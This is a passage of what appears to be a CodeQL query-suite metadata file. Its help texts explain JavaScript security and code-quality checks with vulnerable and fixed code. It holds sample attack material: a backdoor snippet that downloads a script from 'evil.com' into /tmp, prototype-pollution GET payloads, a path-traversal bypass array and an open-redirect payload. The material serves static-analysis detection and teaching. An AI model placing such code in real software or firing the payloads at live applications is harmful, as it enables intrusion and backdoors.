          res.sendFile(absolute);
        }
      });

      ```
      As written, this sanitizer is ineffective: an array like `["../", "/../secret.txt"]` will bypass the sanitizer. The array does not contain `".."` as an element, so the call to `indexOf` returns `-1` . This is problematic since the value of the `absolute` variable then ends up being `"/secret.txt"`. This happens since the concatenation of `"/public/"` and the array results in `"/public/../,/../secret.txt"`, which the `resolve`-call converts to `"/secret.txt"`.

      To fix the sanitizer, check that the request parameter is a string, and not an array:


      ```javascript
      var app = require("express")(),
        path = require("path");

      app.get("/user-files", function(req, res) {
        var file = req.param("file");
        if (typeof file !== 'string' || file.indexOf("..") !== -1) {
          // GOOD
          // we forbid relative paths that contain ..
          // as these could leave the public directory
          res.status(400).send("Bad request");
        } else {
          var absolute = path.resolve("/public/" + file);
          console.log("Sending file: %s", absolute);
          res.sendFile(absolute);
        }
      });

      ```

      ## References
      * Node.js API: [querystring](https://nodejs.org/api/querystring.html).
      * Common Weakness Enumeration: [CWE-843](https://cwe.mitre.org/data/definitions/843.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-862/EmptyPasswordInConfigurationFile.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-862/EmptyPasswordInConfigurationFile.bqrs
    metadata:
      name: Empty password in configuration file
      description: Failing to set a password reduces the security of your code.
      kind: problem
      problem.severity: warning
      security-severity: 7.5
      precision: medium
      id: js/empty-password-in-configuration-file
      tags: |-
        security
               external/cwe/cwe-258
               external/cwe/cwe-862
    queryHelp: |
      # Empty password in configuration file
      The use of an empty string as a password in a configuration file is not secure.


      ## Recommendation
      Choose a strong password and encrypt it if it has to be stored in a configuration file.


      ## References
      * Common Weakness Enumeration: [CWE-258](https://cwe.mitre.org/data/definitions/258.html).
      * Common Weakness Enumeration: [CWE-862](https://cwe.mitre.org/data/definitions/862.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-912/HttpToFileAccess.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-912/HttpToFileAccess.bqrs
    metadata:
      name: Network data written to file
      description:
        Writing network data directly to the file system allows arbitrary
        file upload and might indicate a backdoor.
      kind: path-problem
      problem.severity: warning
      security-severity: 6.3
      precision: medium
      id: js/http-to-file-access
      tags: |-
        security
               external/cwe/cwe-912
               external/cwe/cwe-434
    queryHelp: |
      # Network data written to file
      Storing user-controlled data on the local file system without further validation allows arbitrary file upload, and may be an indication of malicious backdoor code that has been implanted into an otherwise trusted code base.


      ## Recommendation
      Examine the highlighted code closely to ensure that it is behaving as intended.


      ## Example
      The following example shows backdoor code that downloads data from the URL `https://evil.com/script`, and stores it in the local file `/tmp/script`.


      ```javascript
      var https = require("https");
      var fs = require("fs");

      https.get('https://evil.com/script', res => {
        res.on("data", d => {
          fs.writeFileSync("/tmp/script", d)
        })
      });

      ```
      Other parts of the program might then assume that since `/tmp/script` is a local file its contents can be trusted, while in fact they are obtained from an untrusted remote source.


      ## References
      * OWASP: [Trojan Horse](https://www.owasp.org/index.php/Trojan_Horse).
      * OWASP: [Unrestricted File Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload).
      * Common Weakness Enumeration: [CWE-912](https://cwe.mitre.org/data/definitions/912.html).
      * Common Weakness Enumeration: [CWE-434](https://cwe.mitre.org/data/definitions/434.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-915/PrototypePollutingAssignment.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-915/PrototypePollutingAssignment.bqrs
    metadata:
      name: Prototype-polluting assignment
      description: |-
        Modifying an object obtained via a user-controlled property name may
                      lead to accidental mutation of the built-in Object prototype,
                      and possibly escalate to remote code execution or cross-site scripting.
      kind: path-problem
      problem.severity: warning
      security-severity: 6.1
      precision: high
      id: js/prototype-polluting-assignment
      tags: |-
        security
               external/cwe/cwe-078
               external/cwe/cwe-079
               external/cwe/cwe-094
               external/cwe/cwe-400
               external/cwe/cwe-471
               external/cwe/cwe-915
    queryHelp: |
      # Prototype-polluting assignment
      Most JavaScript objects inherit the properties of the built-in `Object.prototype` object. Prototype pollution is a type of vulnerability in which an attacker is able to modify `Object.prototype`. Since most objects inherit from the compromised `Object.prototype` object, the attacker can use this to tamper with the application logic, and often escalate to remote code execution or cross-site scripting.

      One way to cause prototype pollution is by modifying an object obtained via a user-controlled property name. Most objects have a special `__proto__` property that refers to `Object.prototype`. An attacker can abuse this special property to trick the application into performing unintended modifications of `Object.prototype`.


      ## Recommendation
      Use an associative data structure that is resilient to untrusted key values, such as a [Map](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map). In some cases, a prototype-less object created with [Object.create(null)](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/create) may be preferable.

      Alternatively, restrict the computed property name so it can't clash with a built-in property, either by prefixing it with a constant string, or by rejecting inputs that don't conform to the expected format.


      ## Example
      In the example below, the untrusted value `req.params.id` is used as the property name `req.session.todos[id]`. If a malicious user passes in the ID value `__proto__`, the variable `items` will then refer to `Object.prototype`. Finally, the modification of `items` then allows the attacker to inject arbitrary properties onto `Object.prototype`.


      ```javascript
      let express = require('express');
      let app = express()

      app.put('/todos/:id', (req, res) => {
          let id = req.params.id;
          let items = req.session.todos[id];
          if (!items) {
              items = req.session.todos[id] = {};
          }
          items[req.query.name] = req.query.text;
          res.end(200);
      });

      ```
      One way to fix this is to use [Map](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map) objects to associate key/value pairs instead of regular objects, as shown below:


      ```javascript
      let express = require('express');
      let app = express()

      app.put('/todos/:id', (req, res) => {
          let id = req.params.id;
          let items = req.session.todos.get(id);
          if (!items) {
              items = new Map();
              req.sessions.todos.set(id, items);
          }
          items.set(req.query.name, req.query.text);
          res.end(200);
      });

      ```
      Another way to fix it is to prevent the `__proto__` property from being used as a key, as shown below:


      ```javascript
      let express = require('express');
      let app = express()

      app.put('/todos/:id', (req, res) => {
          let id = req.params.id;
          if (id === '__proto__' || id === 'constructor' || id === 'prototype') {
              res.end(403);
              return;
          }
          let items = req.session.todos[id];
          if (!items) {
              items = req.session.todos[id] = {};
          }
          items[req.query.name] = req.query.text;
          res.end(200);
      });

      ```

      ## References
      * MDN: [Object.prototype.__proto__](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/proto)
      * MDN: [Map](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map)
      * Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).
      * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
      * Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).
      * Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).
      * Common Weakness Enumeration: [CWE-471](https://cwe.mitre.org/data/definitions/471.html).
      * Common Weakness Enumeration: [CWE-915](https://cwe.mitre.org/data/definitions/915.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-915/PrototypePollutingFunction.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-915/PrototypePollutingFunction.bqrs
    metadata:
      name: Prototype-polluting function
      description: |-
        Functions recursively assigning properties on objects may be
                      the cause of accidental modification of a built-in prototype object.
      kind: path-problem
      problem.severity: warning
      security-severity: 6.1
      precision: high
      id: js/prototype-pollution-utility
      tags: |-
        security
               external/cwe/cwe-078
               external/cwe/cwe-079
               external/cwe/cwe-094
               external/cwe/cwe-400
               external/cwe/cwe-471
               external/cwe/cwe-915
    queryHelp: |
      # Prototype-polluting function
      Most JavaScript objects inherit the properties of the built-in `Object.prototype` object. Prototype pollution is a type of vulnerability in which an attacker is able to modify `Object.prototype`. Since most objects inherit from the compromised `Object.prototype`, the attacker can use this to tamper with the application logic, and often escalate to remote code execution or cross-site scripting.

      One way to cause prototype pollution is through use of an unsafe *merge* or *extend* function to recursively copy properties from one object to another, or through the use of a *deep assignment* function to assign to an unverified chain of property names. Such a function has the potential to modify any object reachable from the destination object, and the built-in `Object.prototype` is usually reachable through the special properties `__proto__` and `constructor.prototype`.


      ## Recommendation
      The most effective place to guard against this is in the function that performs the recursive copy or deep assignment.

      Only merge or assign a property recursively when it is an own property of the *destination* object. Alternatively, block the property names `__proto__` and `constructor` from being merged or assigned to.


      ## Example
      This function recursively copies properties from `src` to `dst`:


      ```javascript
      function merge(dst, src) {
          for (let key in src) {
              if (!src.hasOwnProperty(key)) continue;
              if (isObject(dst[key])) {
                  merge(dst[key], src[key]);
              } else {
                  dst[key] = src[key];
              }
          }
      }

      ```
      However, if `src` is the object `{"__proto__": {"isAdmin": true}}`, it will inject the property `isAdmin: true` in `Object.prototype`.

      The issue can be fixed by ensuring that only own properties of the destination object are merged recursively:


      ```javascript
      function merge(dst, src) {
          for (let key in src) {
              if (!src.hasOwnProperty(key)) continue;
              if (dst.hasOwnProperty(key) && isObject(dst[key])) {
                  merge(dst[key], src[key]);
              } else {
                  dst[key] = src[key];
              }
          }
      }

      ```
      Alternatively, block the `__proto__` and `constructor` properties:


      ```javascript
      function merge(dst, src) {
          for (let key in src) {
              if (!src.hasOwnProperty(key)) continue;
              if (key === "__proto__" || key === "constructor") continue;
              if (isObject(dst[key])) {
                  merge(dst[key], src[key]);
              } else {
                  dst[key] = src[key];
              }
          }
      }

      ```

      ## References
      * Prototype pollution attacks: [lodash](https://hackerone.com/reports/380873), [jQuery](https://hackerone.com/reports/454365), [extend](https://hackerone.com/reports/381185), [just-extend](https://hackerone.com/reports/430291), [merge.recursive](https://hackerone.com/reports/381194).
      * Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).
      * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
      * Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).
      * Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).
      * Common Weakness Enumeration: [CWE-471](https://cwe.mitre.org/data/definitions/471.html).
      * Common Weakness Enumeration: [CWE-915](https://cwe.mitre.org/data/definitions/915.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-915/PrototypePollutingMergeCall.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-915/PrototypePollutingMergeCall.bqrs
    metadata:
      name: Prototype-polluting merge call
      description: |-
        Recursively merging a user-controlled object into another object
                      can allow an attacker to modify the built-in Object prototype,
                      and possibly escalate to remote code execution or cross-site scripting.
      kind: path-problem
      problem.severity: error
      security-severity: 6.1
      precision: high
      id: js/prototype-pollution
      tags: |-
        security
               external/cwe/cwe-078
               external/cwe/cwe-079
               external/cwe/cwe-094
               external/cwe/cwe-400
               external/cwe/cwe-471
               external/cwe/cwe-915
    queryHelp: |
      # Prototype-polluting merge call
      Most JavaScript objects inherit the properties of the built-in `Object.prototype` object. Prototype pollution is a type of vulnerability in which an attacker is able to modify `Object.prototype`. Since most objects inherit from the compromised `Object.prototype`, the attacker can use this to tamper with the application logic, and often escalate to remote code execution or cross-site scripting.

      One way to cause prototype pollution is through use of an unsafe *merge* or *extend* function to recursively copy properties from an untrusted source object. Such a call can modify any object reachable from the destination object, and the built-in `Object.prototype` is usually reachable through the special properties `__proto__` and `constructor.prototype`. An attacker can abuse this by sending an object with these property names and thereby modify `Object.prototype`.


      ## Recommendation
      Update your library dependencies in order to use a safe version of the *merge* or *extend* function. If your library has no fixed version, switch to another library.


      ## Example
      In the example below, the untrusted value `req.query.prefs` is parsed as JSON and then copied into a new object:


      ```javascript
      app.get('/news', (req, res) => {
        let prefs = lodash.merge({}, JSON.parse(req.query.prefs));
      })

      ```
      Prior to lodash 4.17.11 this would be vulnerable to prototype pollution. An attacker could send the following GET request:

      ```
      GET /news?prefs={"constructor":{"prototype":{"xxx":true}}}
      ```
      This causes the `xxx` property to be injected on `Object.prototype`. Fix this by updating the lodash version:


      ```json
      {
        "dependencies": {
          "lodash": "^4.17.12"
        }
      }

      ```
      Note that some web frameworks, such as Express, parse query parameters using extended URL-encoding by default. When this is the case, the application may be vulnerable even if not using `JSON.parse`. The example below would also be susceptible to prototype pollution:


      ```javascript
      app.get('/news', (req, res) => {
        let config = lodash.merge({}, {
          prefs: req.query.prefs
        });
      })

      ```
      In the above example, an attacker can cause prototype pollution by sending the following GET request:

      ```
      GET /news?prefs[constructor][prototype][xxx]=true
      ```

      ## References
      * Prototype pollution attacks: [lodash](https://hackerone.com/reports/380873), [jQuery](https://hackerone.com/reports/454365), [extend](https://hackerone.com/reports/381185), [just-extend](https://hackerone.com/reports/430291), [merge.recursive](https://hackerone.com/reports/381194).
      * Express: [urlencoded()](https://expressjs.com/en/api.html#express.urlencoded)
      * Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).
      * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
      * Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).
      * Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).
      * Common Weakness Enumeration: [CWE-471](https://cwe.mitre.org/data/definitions/471.html).
      * Common Weakness Enumeration: [CWE-915](https://cwe.mitre.org/data/definitions/915.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-916/InsufficientPasswordHash.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-916/InsufficientPasswordHash.bqrs
    metadata:
      name: Use of password hash with insufficient computational effort
      description:
        Creating a hash of a password with low computational effort makes
        the hash vulnerable to password cracking attacks.
      kind: path-problem
      problem.severity: warning
      security-severity: 8.1
      precision: high
      id: js/insufficient-password-hash
      tags: |-
        security
               external/cwe/cwe-916
    queryHelp: |
      # Use of password hash with insufficient computational effort
      Storing cryptographic hashes of passwords is standard security practice, but it is equally important to select the right hashing scheme. If an attacker obtains the hashed passwords of an application, the password hashing scheme should still prevent the attacker from easily obtaining the original cleartext passwords.

      A good password hashing scheme requires a computation that cannot be done efficiently. Standard hashing schemes, such as `md5` or `sha1`, are efficiently computable, and are therefore not suitable for password hashing.


      ## Recommendation
      Use a secure password hashing scheme such as `bcrypt`, `scrypt`, `PBKDF2`, or `Argon2`.


      ## Example
      In the example below, the `md5` algorithm computes the hash of a password.


      ```javascript
      const crypto = require("crypto");
      function hashPassword(password) {
          var hasher = crypto.createHash('md5');
          var hashed = hasher.update(password).digest("hex"); // BAD
          return hashed;
      }

      ```
      This is not secure, since the password can be efficiently cracked by an attacker that obtains the hash. A more secure scheme is to hash the password with the `bcrypt` algorithm:


      ```javascript
      const bcrypt = require("bcrypt");
      function hashPassword(password, salt) {
        var hashed = bcrypt.hashSync(password, salt); // GOOD
        return hashed;
      }

      ```

      ## References
      * OWASP: [Password storage](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html).
      * Common Weakness Enumeration: [CWE-916](https://cwe.mitre.org/data/definitions/916.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-918/ClientSideRequestForgery.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-918/ClientSideRequestForgery.bqrs
    metadata:
      name: Client-side request forgery
      description: |-
        Making a client-to-server request with user-controlled data in the URL allows a request forgery attack
                      against the client.
      kind: path-problem
      problem.severity: error
      security-severity: 5.0
      precision: medium
      id: js/client-side-request-forgery
      tags: |-
        security
               external/cwe/cwe-918
    queryHelp: |
      # Client-side request forgery
      Directly incorporating user input in the URL of an outgoing HTTP request can enable a request forgery attack, in which the request is altered to target an unintended API endpoint or resource. A client-side forged request may perform an unwanted action affecting the victim's account, or may lead to cross-site scripting if the request response is handled in an unsafe way. This is different from CSRF (cross-site request forgery), and will usually bypass CSRF protections. This is usually less severe than SSRF (server-side request forgery), as it does not expose internal services.


      ## Recommendation
      Restrict user inputs in the URL of an outgoing request, in particular:

      * Avoid user input in the hostname of the URL. Pick the hostname from an allow-list instead of constructing it directly from user input.
      * Take care when user input is part of the pathname of the URL. Restrict the input so that path traversal ("`../`") cannot be used to redirect the request to an unintended endpoint.

      ## Example
      The following example shows an HTTP request used to fetch the pre-rendered HTML body of a message. It is using the endpoint `/api/messages/ID`, which is believed to respond with a safe HTML string, to be embedded in the page:


      ```javascript
      async function loadMessage() {
          const query = new URLSearchParams(location.search);
          const url = '/api/messages/' + query.get('message_id');
          const data = await (await fetch(url)).json();
          document.getElementById('message').innerHTML = data.html;
      }

      ```
      However, the format of the message ID is not checked, and an attacker can abuse this to alter the endpoint targeted by the request. If they can redirect it to an endpoint that returns an untrusted value, this leads to cross-site scripting.

      For example, given the query string `message_id=../pastebin/123`, the request will end up targeting the `/api/pastebin` endpoint. Or if there is an open redirect on the login page, a query string like `message_id=../../login?redirect_url=https://evil.com` could give the attacker full control over the response as well.

      In example below, the input has been restricted to a number so that the endpoint cannot be altered:


      ```javascript
      async function loadMessage() {
          const query = new URLSearchParams(location.search);
          const url = '/api/messages/' + Number(query.get('message_id'));
          const data = await (await fetch(url)).json();
          document.getElementById('message').innerHTML = data.html;
      }

      ```

      ## References
      * OWASP: [Server-side request forgery](https://cwe.mitre.org/data/definitions/918.html)
      * OWASP: [Cross-site request forgery](https://cwe.mitre.org/data/definitions/352.html)
      * Common Weakness Enumeration: [CWE-918](https://cwe.mitre.org/data/definitions/918.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-918/RequestForgery.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-918/RequestForgery.bqrs
    metadata:
      name: Server-side request forgery
      description:
        Making a network request with user-controlled data in the URL allows
        for request forgery attacks.
      kind: path-problem
      problem.severity: error
      security-severity: 9.1
      precision: high
      id: js/request-forgery
      tags: |-
        security
               external/cwe/cwe-918
    queryHelp: |
      # Server-side request forgery
      Directly incorporating user input in the URL of an outgoing HTTP request can enable a request forgery attack, in which the request is altered to target an unintended API endpoint or resource. If the server performing the request is connected to an internal network, this can give an attacker the means to bypass the network boundary and make requests against internal services. A forged request may perform an unintended action on behalf of the attacker, or cause information leak if redirected to an external server or if the request response is fed back to the user. It may also compromise the server making the request, if the request response is handled in an unsafe way.


      ## Recommendation
      Restrict user inputs in the URL of an outgoing request, in particular:

      * Avoid user input in the hostname of the URL. Pick the hostname from an allow-list instead of constructing it directly from user input.
      * Take care when user input is part of the pathname of the URL. Restrict the input so that path traversal ("`../`") cannot be used to redirect the request to an unintended endpoint.

      ## Example
      The following example shows an HTTP request parameter being used directly in the URL of a request without validating the input, which facilitates an SSRF attack. The request `http.get(...)` is vulnerable since attackers can choose the value of `target` to be anything they want. For instance, the attacker can choose `"internal.example.com/#"` as the target, causing the URL used in the request to be `"https://internal.example.com/#.example.com/data"`.

      A request to `https://internal.example.com` may be problematic if that server is not meant to be directly accessible from the attacker's machine.


      ```javascript
      import http from 'http';

      const server = http.createServer(function(req, res) {
          const target = new URL(req.url, "http://example.com").searchParams.get("target");

          // BAD: `target` is controlled by the attacker
          http.get('https://' + target + ".example.com/data/", res => {
              // process request response ...
          });

      });

      ```
      One way to remedy the problem is to use the user input to select a known fixed string before performing the request:


      ```javascript
      import http from 'http';

      const server = http.createServer(function(req, res) {
          const target = new URL(req.url, "http://example.com").searchParams.get("target");

          let subdomain;
          if (target === 'EU') {
              subdomain = "europe"
          } else {
              subdomain = "world"
          }

          // GOOD: `subdomain` is controlled by the server
          http.get('https://' + subdomain + ".example.com/data/", res => {
              // process request response ...
          });

      });

      ```

      ## References
      * OWASP: [SSRF](https://www.owasp.org/index.php/Server_Side_Request_Forgery)
      * Common Weakness Enumeration: [CWE-918](https://cwe.mitre.org/data/definitions/918.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/trest/test.ql
    relativeBqrsPath: codeql/javascript-queries/Security/trest/test.bqrs
    metadata: {}
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Statements/DanglingElse.ql
    relativeBqrsPath: codeql/javascript-queries/Statements/DanglingElse.bqrs
    metadata:
      name: Misleading indentation of dangling 'else'
      description:
        The 'else' clause of an 'if' statement should be aligned with the
        'if' it belongs to.
      kind: problem
      problem.severity: warning
      id: js/misleading-indentation-of-dangling-else
      tags: |-
        quality
               maintainability
               readability
               statistical
               non-attributable
               external/cwe/cwe-483
      precision: very-high
    queryHelp:
      "# Misleading indentation of dangling 'else'\nIn JavaScript, an `else`\
      \ clause is always associated with the closest preceding `if` statement that does\
      \ not already have an `else` clause. It is good practice to use indentation to\
      \ clarify this structure by indenting matching `if` ... `else` pairs by the same\
      \ amount of whitespace.\n\nIndenting the `else` clause of a nested `if` statement\
      \ to suggest that it matches an outer `if` statement (instead of the one it actually\
      \ belongs to) is confusing to readers and may even indicate a bug in the program\
      \ logic.\n\n\n## Recommendation\nEnsure that matching `if` ... `else` pairs are\
      \ indented accordingly.\n\n\n## Example\nIn the following example, the `else`\
      \ on line 5 belongs to the `if` on line 3, while its indentation wrongly suggests\
      \ that it belongs to the `if` on line 2.\n\n\n```javascript\nfunction f() {\n\t\
      if (cond1())\n\t\tif (cond2())\n\t\t\treturn 23;\n\telse\n\t\treturn 42;\n\treturn\
      \ 56;\n}\n\n```\nTo correct this issue, indent the `else` on line 5 further:\n\
      \n\n```javascript\nfunction f() {\n\tif (cond1())\n\t\tif (cond2())\n\t\t\treturn\
      \ 23;\n\t\telse\n\t\t\treturn 42;\n\treturn 56;\n}\n\n```\nConfusion about which\
      \ `if` belongs to which `else` can also be avoided by always enclosing the branches\
      \ of an `if` statement in curly braces:\n\n\n```javascript\nfunction f() {\n\t\
      if (cond1()) {\n\t\tif (cond2()) {\n\t\t\treturn 23;\n\t\t} else {\n\t\t\treturn\
      \ 42;\n\t\t}\n\t}\n\treturn 56;\n}\n\n```\n\n## References\n* Wikipedia: [Dangling\
      \ else](http://en.wikipedia.org/wiki/Dangling_else).\n* Common Weakness Enumeration:\
      \ [CWE-483](https://cwe.mitre.org/data/definitions/483.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Statements/EphemeralLoop.ql
    relativeBqrsPath: codeql/javascript-queries/Statements/EphemeralLoop.bqrs
    metadata:
      name: Loop body executes at most once
      description: |-
        A loop that executes at most once is confusing and should be rewritten
                      as a conditional.
      kind: problem
      problem.severity: recommendation
      id: js/single-run-loop
      tags: readability
      precision: low
    queryHelp: |
      # Loop body executes at most once
      If the body of a loop can only execute at most once, then the whole loop is equivalent to an `if` conditional. This is confusing for readers, and may even indicate a logic error.


      ## Recommendation
      Replace the loop with a conditional.


      ## Example
      In the following example, the function `nextToken` reads a value `c` from a `reader`, and then enters a `while` loop if `c` is not falsy. Inside the loop body, it performs a `switch` on `c`, taking different actions depending on its value. After the `switch`, it then unconditionally breaks out of the loop.

      In other words, the loop body either does not execute at all (if `c` is falsy), or exactly once (if it is truthy), but never more than once.


      ```javascript
      function nextToken(reader){
        var c = reader.read(), token = null;

        while (c) {
          switch(c) {
          case "/":
            if(reader.peek() == "*")
              token = commentToken(reader, c, startLine, startCol);
            else
              token = charToken(reader, c, startLine, startCol);
            break;
          case '"':
          case "'":
            token = stringToken(c, startLine, startCol);
            break;
          default:
            token = charToken(reader, c, startLine, startCol);
          }

          break;
        }

        return token;
      }
      ```
      Assuming that this is the desired behavior, the `while` loop should be replaced with an `if` statement as follows:


      ```javascript
      function nextToken(reader){
        var c = reader.read(), token = null;

        if (c) {
          switch(c) {
          case "/":
            if(reader.peek() == "*")
              token = commentToken(reader, c, startLine, startCol);
            else
              token = charToken(reader, c, startLine, startCol);
            break;
          case '"':
          case "'":
            token = stringToken(c, startLine, startCol);
            break;
          default:
            token = charToken(reader, c, startLine, startCol);
          }
        }

        return token;
      }
      ```

      ## References
      * Mozilla Developer Network: [Loops and iteration](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Loops_and_iteration).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Statements/IgnoreArrayResult.ql
    relativeBqrsPath: codeql/javascript-queries/Statements/IgnoreArrayResult.bqrs
    metadata:
      name: Ignoring result from pure array method
      description:
        Ignoring the result of an array method that does not modify its receiver
        is generally an error.
      kind: problem
      problem.severity: warning
      id: js/ignore-array-result
      tags: |-
        quality
               reliability
               correctness
      precision: high
    queryHelp:
      "# Ignoring result from pure array method\nThe `concat`, `join` and `slice`\
      \ methods are pure and do not modify any of the inputs or the array the method\
      \ is called on. It is therefore generally an error to ignore the return value\
      \ from a call to one of these methods.\n\n\n## Recommendation\nUse the returned\
      \ value from the calls to `concat`, `join` or `slice`.\n\n\n## Example\nA function\
      \ `extend` is defined in the following example. The function uses the `concat`\
      \ method to add elements to the `arr` array. However, the `extend` function has\
      \ no effect as the return value from `concat` is ignored:\n\n\n```javascript\n\
      var arr = [1,2,3];\n\nfunction extend(others) {\n\tarr.concat(others);\n}\n```\n\
      Assigning the returned value from the call to `concat` to the `arr` variable fixes\
      \ the error:\n\n\n```javascript\nvar arr = [1,2,3];\n\nfunction extend(others)\
      \ {\n\tarr = arr.concat(others);\n}\n```\n\n## References\n* Mozilla Developer\
      \ Network: [Array concat](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/concat).\n\
      * Mozilla Developer Network: [Array slice](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/slice).\n\
      * Mozilla Developer Network: [Array join](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/join).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Statements/ImplicitReturn.ql
    relativeBqrsPath: codeql/javascript-queries/Statements/ImplicitReturn.bqrs
    metadata:
      name: Not all control paths return a value
      description: |-
        Functions where some execution paths return an explicit value while others
                      "fall off" the end of the function and return 'undefined' are hard to maintain and use.
      kind: problem
      problem.severity: recommendation
      id: js/implicit-return
      tags: maintainability
      precision: medium
    queryHelp:
      "# Not all control paths return a value\nUnlike Java and other statically\
      \ typed languages, JavaScript does not require that all execution paths in a function\
      \ return a value: if an invocation of the function \"falls off\" the end of the\
      \ function without explicitly returning a value, the special value `undefined`\
      \ is implicitly returned.\n\nRelying on this behavior is dangerous, however, since\
      \ it can lead to situations where `undefined` is returned by accident, simply\
      \ because the programmer overlooked a possible execution path. Functions with\
      \ implicit return behavior may also be hard to use in client code, which has to\
      \ be prepared for either an explicit return value or `undefined` being returned.\n\
      \n\n## Recommendation\nInsert an explicit return statement. If the \"fall through\"\
      \ behavior should never be triggered, it is often a good idea to instead throw\
      \ an exception.\n\n\n## Example\nIn the following example, the function `call`\
      \ takes two arguments `o` and `m`. It checks whether `o` has a function-valued\
      \ property with name `m`, and if so invokes it as a method, returning the result.\
      \ Otherwise, nothing is returned.\n\n\n```javascript\nfunction call(o, m) {\n\t\
      if (o && typeof o[m] === 'function')\n\t\treturn o[m]();\n}\n```\nAssuming that\
      \ the second case should never occur, an exception should be thrown as follows:\n\
      \n\n```javascript\nfunction call(o, m) {\n\tif (o && typeof o[m] === 'function')\n\
      \t\treturn o[m]();\n\tthrow new Error(\"no such method\");\n}\n```\n\n## References\n\
      * Mozilla Developer Network: [Return](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/return).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Statements/InconsistentLoopOrientation.ql
    relativeBqrsPath: codeql/javascript-queries/Statements/InconsistentLoopOrientation.bqrs
    metadata:
      name: Inconsistent direction of for loop
      description: |-
        A 'for' loop that increments its loop variable but checks it
                      against a lower bound, or decrements its loop variable but
                      checks it against an upper bound, will either stop iterating
                      immediately or keep iterating indefinitely, and is usually
                      indicative of a typo.
      kind: problem
      problem.severity: error
      id: js/inconsistent-loop-direction
      tags: |-
        quality
               reliability
               correctness
               external/cwe/cwe-835
      precision: very-high
    queryHelp: |
      # Inconsistent direction of for loop
      Most `for` loops either increment a variable until an upper bound is reached, or decrement a variable until a lower bound is reached. If, instead, the variable is incremented but checked against a lower bound, or decremented but checked against an upper bound, then the loop will either terminate immediately and never execute its body, or it will keep iterating indefinitely. Neither is likely to be intentional, and is most likely the result of a typo.


      ## Recommendation
      Examine the loop carefully to check whether its test expression or update expression are erroneous.


      ## Example
      In the following example, two loops are used to set all elements of an array `a` outside a range `lower`..`upper` to zero. However, the second loop contains a typo: the loop variable `i` is decremented instead of incremented, so `i` is counted downwards from `upper+1` to `0`, `-1`, `-2` and so on.


      ```javascript
      // zero out everything below index `lower`
      for (i=lower-1; i>=0; --i)
          a[i] = 0;

      // zero out everything above index `upper`
      for (i=upper+1; i<a.length; --i)
          a[i] = 0;

      ```
      To correct this issue, change the second loop to increment its loop variable instead:


      ```javascript
      // zero out everything below index `lower`
      for (i=lower-1; i>=0; --i)
          a[i] = 0;

      // zero out everything above index `upper`
      for (i=upper+1; i<a.length; ++i)
          a[i] = 0;

      ```

      ## References
      * Mozilla Developer Network: [for](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/for).
      * Common Weakness Enumeration: [CWE-835](https://cwe.mitre.org/data/definitions/835.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Statements/InconsistentReturn.ql
    relativeBqrsPath: codeql/javascript-queries/Statements/InconsistentReturn.bqrs
    metadata:
      name: Inconsistent return statements
      description:
        "A function should either always return an explicit value, or never\
        \ return a value."
      kind: problem
      problem.severity: recommendation
      id: js/mixed-returns
      tags: |-
        reliability
               maintainability
      precision: medium
    queryHelp:
      "# Inconsistent return statements\nSince JavaScript programs are not\
      \ statically type checked, it is acceptable for a function to return values of\
      \ different types under different circumstances. In particular, a function can\
      \ sometimes return the special value `undefined`, while at other times it returns,\
      \ say, a number. If this is the desired behavior, it should be documented by explicitly\
      \ returning `undefined` or an expression that evaluates to `undefined` (such as\
